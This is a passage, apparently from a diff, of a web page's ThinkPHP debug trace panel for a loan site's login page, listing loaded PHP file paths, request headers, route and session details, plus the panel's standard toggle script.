#EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/vendor/markbaker/complex/classes/src/operations/divideby.php ( 1.75 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/vendor/markbaker/complex/classes/src/operations/divideinto.php ( 1.75 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/vendor/markbaker/matrix/classes/src/Functions/adjoint.php ( 0.69 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/vendor/markbaker/matrix/classes/src/Functions/antidiagonal.php ( 0.74 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/vendor/markbaker/matrix/classes/src/Functions/cofactors.php ( 0.70 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/vendor/markbaker/matrix/classes/src/Functions/determinant.php ( 0.71 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/vendor/markbaker/matrix/classes/src/Functions/diagonal.php ( 0.70 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/vendor/markbaker/matrix/classes/src/Functions/identity.php ( 0.70 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/vendor/markbaker/matrix/classes/src/Functions/inverse.php ( 0.69 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/vendor/markbaker/matrix/classes/src/Functions/minors.php ( 0.69 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/vendor/markbaker/matrix/classes/src/Functions/trace.php ( 0.69 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/vendor/markbaker/matrix/classes/src/Functions/transpose.php ( 0.71 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/vendor/markbaker/matrix/classes/src/Operations/add.php ( 0.93 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/vendor/markbaker/matrix/classes/src/Operations/directsum.php ( 0.95 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/vendor/markbaker/matrix/classes/src/Operations/subtract.php ( 0.96 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/vendor/markbaker/matrix/classes/src/Operations/multiply.php ( 0.98 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/vendor/markbaker/matrix/classes/src/Operations/divideby.php ( 0.96 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/vendor/markbaker/matrix/classes/src/Operations/divideinto.php ( 1.00 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/vendor/topthink/think-helper/src/helper.php ( 2.88 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/vendor/karsonzhang/fastadmin-addons/src/common.php ( 15.07 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/library/think/Route.php ( 60.23 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/library/think/Config.php ( 6.38 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/library/think/Hook.php ( 4.71 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/vendor/overtrue/wechat/src/Kernel/Support/Helpers.php ( 2.63 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/vendor/overtrue/wechat/src/Kernel/Helpers.php ( 1.89 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/vendor/topthink/think-captcha/src/helper.php ( 1.59 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/library/think/Validate.php ( 41.63 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/vendor/topthink/think-queue/src/common.php ( 1.19 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/library/think/Console.php ( 23.13 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/library/think/Error.php ( 3.75 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/convention.php ( 10.37 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/library/think/App.php ( 21.51 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/library/think/Request.php ( 49.78 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/application/config.php ( 11.81 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/library/think/Env.php ( 1.21 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/application/database.php ( 2.20 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/application/extra/addons.php ( 0.12 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/application/extra/site.php ( 0.91 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/application/extra/upload.php ( 0.82 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/application/tags.php ( 1.23 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/application/common.php ( 16.45 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/helper.php ( 17.30 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/library/think/Debug.php ( 7.13 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/library/think/Log.php ( 6.05 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/library/think/Cache.php ( 6.10 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/library/think/cache/driver/File.php ( 7.27 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/library/think/cache/Driver.php ( 5.98 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/application/common/behavior/Common.php ( 3.02 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/library/think/Lang.php ( 7.23 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/lang/zh-cn.php ( 11.81 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/application/index/lang/zh-cn.php ( 10.79 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/extend/fast/Form.php ( 39.71 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/application/index/controller/User.php ( 22.93 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/application/common/controller/Frontend.php ( 5.09 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/library/think/Controller.php ( 6.07 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/library/traits/controller/Jump.php ( 4.90 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/library/think/View.php ( 6.77 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/library/think/view/driver/Think.php ( 5.64 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/library/think/Template.php ( 44.90 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/library/think/template/driver/File.php ( 2.24 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/application/common/library/Auth.php ( 16.07 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/library/think/Cookie.php ( 7.54 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/application/common/model/Config.php ( 6.79 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/library/think/Model.php ( 69.14 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/library/think/Url.php ( 12.72 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/application/index/lang/en/user.php ( 2.88 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/runtime/temp/1c48c15f5bf4c09d9bbb29813a99b71f.php ( 31.38 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/library/think/Session.php ( 10.86 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/library/think/Response.php ( 8.28 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/library/think/debug/Html.php ( 4.17 KB )</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">/www/wwwroot/loan/thinkphp/library/think/Db.php ( 6.67 KB )</li>                </ol>
+            </div>
+                        <div style="display:none;">
+                <ol style="padding: 0; margin:0">
+                    <li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">[ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000033s ]</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">[ CACHE ] INIT File</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">[ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001371s ]</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">[ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.000661s ]</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">[ LANG ] /www/wwwroot/loan/thinkphp/lang/zh-cn.php</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">[ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000035s ]</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">[ ROUTE ] array (
+  'type' =&gt; 'module',
+  'module' =&gt; 
+  array (
+    0 =&gt; 'index',
+    1 =&gt; 'user',
+    2 =&gt; 'login',
+  ),
+)</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">[ HEADER ] array (
+  'host' =&gt; 'www.nowtdloan.com',
+  'accept-encoding' =&gt; 'gzip, deflate',
+  'accept-language' =&gt; 'zh-CN,zh;q=0.9,en;q=0.8',
+  'referer' =&gt; 'http://www.nowtdloan.com/index/user/apply.html',
+  'accept' =&gt; '*/*',
+  'user-agent' =&gt; 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
+  'content-length' =&gt; '',
+  'content-type' =&gt; '',
+)</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">[ PARAM ] array (
+)</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">[ LANG ] /www/wwwroot/loan/public/../application/index/lang/zh-cn.php</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">[ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.003239s ]</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">[ LANG ] /www/wwwroot/loan/public/../application/index/lang/en/user.php</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">[ RUN ] app\index\controller\User-&gt;login[ /www/wwwroot/loan/application/index/controller/User.php ]</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">[ VIEW ] /www/wwwroot/loan/public/../application/index/view/user/login.html [ array (
+  0 =&gt; 'user',
+  1 =&gt; 'site',
+  2 =&gt; 'config',
+  3 =&gt; 'url',
+  4 =&gt; 'title',
+) ]</li><li style="border-bottom:1px solid #EEE;font-size:14px;padding:0 12px">[ SESSION ] INIT array (
+  'id' =&gt; '',
+  'var_session_id' =&gt; '',
+  'prefix' =&gt; 'think',
+  'type' =&gt; '',
+  'auto_start' =&gt; true,
+)</li>                </ol>
+            </div>
+                        <div style="display:none;">
+                <ol style="padding: 0; margin:0">
+                                    </ol>
+            </div>
+                        <div style="display:none;">
+                <ol style="padding: 0; margin:0">
+                                    </ol>
+            </div>
+                        <div style="display:none;">
+                <ol style="padding: 0; margin:0">
+                                    </ol>
+            </div>
+                    </div>
+    </div>
+    <div id="think_page_trace_close" style="display:none;text-align:right;height:15px;position:absolute;top:10px;right:12px;cursor:pointer;"><img style="vertical-align:top;" src="data:image/gif;base64,R0lGODlhDwAPAJEAAAAAAAMDA////wAAACH/C1hNUCBEYXRhWE1QPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS4wLWMwNjAgNjEuMTM0Nzc3LCAyMDEwLzAyLzEyLTE3OjMyOjAwICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M1IFdpbmRvd3MiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MUQxMjc1MUJCQUJDMTFFMTk0OUVGRjc3QzU4RURFNkEiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MUQxMjc1MUNCQUJDMTFFMTk0OUVGRjc3QzU4RURFNkEiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDoxRDEyNzUxOUJBQkMxMUUxOTQ5RUZGNzdDNThFREU2QSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDoxRDEyNzUxQUJBQkMxMUUxOTQ5RUZGNzdDNThFREU2QSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PgH//v38+/r5+Pf29fTz8vHw7+7t7Ovq6ejn5uXk4+Lh4N/e3dzb2tnY19bV1NPS0dDPzs3My8rJyMfGxcTDwsHAv769vLu6ubi3trW0s7KxsK+urayrqqmop6alpKOioaCfnp2cm5qZmJeWlZSTkpGQj46NjIuKiYiHhoWEg4KBgH9+fXx7enl4d3Z1dHNycXBvbm1sa2ppaGdmZWRjYmFgX15dXFtaWVhXVlVUU1JRUE9OTUxLSklIR0ZFRENCQUA/Pj08Ozo5ODc2NTQzMjEwLy4tLCsqKSgnJiUkIyIhIB8eHRwbGhkYFxYVFBMSERAPDg0MCwoJCAcGBQQDAgEAACH5BAAAAAAALAAAAAAPAA8AAAIdjI6JZqotoJPR1fnsgRR3C2jZl3Ai9aWZZooV+RQAOw=="></div>
+</div>
+
+
+<script type="text/javascript">
+    (function(){
+        var tab_tit  = document.getElementById('think_page_trace_tab_tit').getElementsByTagName('span');
+        var tab_cont = document.getElementById('think_page_trace_tab_cont').getElementsByTagName('div');
+        var open     = document.getElementById('think_page_trace_open');
+        var close    = document.getElementById('think_page_trace_close').children[0];
+        var trace    = document.getElementById('think_page_trace_tab');
+        var cookie   = document.cookie.match(/thinkphp_show_page_trace=(\d\|\d)/);
+        var history  = (cookie && typeof cookie[1] != 'undefined' && cookie[1].split('|')) || [0,0];
+        open.onclick = function(){
+            trace.style.display = 'block';
+            this.style.display = 'none';
+            close.parentNode.style.display = 'block';
+            history[0] = 1;
+            document.cookie = 'thinkphp_show_page_trace='+history.join('|')
+        }
+        close.onclick = function(){
+            trace.style.display = 'none';
+            this.parentNode.style.display = 'none';
+            open.style.display = 'block';
+            history[0] = 0;
+            document.cookie = 'thinkphp_show_page_trace='+history.join('|')
+        }
+        for(var i = 0; i < tab_tit.length; i++){
+            tab_tit[i].onclick = (function(i){
+                return function(){
+                    for(var j = 0; j < tab_cont.length; j++){
+                        tab_cont[j].style.display = 'none';
+                        tab_tit[j].style.color = '#999';
+                    }
+                    tab_cont[i].style.display = 'block';
+                    tab_tit[i].style.color = '#000';
+                    history[1] = i;
+                    document.cookie = 'thinkphp_show_page_trace='+history.join('|')
+                }
+            })(i)
+        }
+        parseInt(history[0]) && open.click();
+        tab_tit[history[1]].click();
+    })();
+</script>
+</body>
+
+</html>
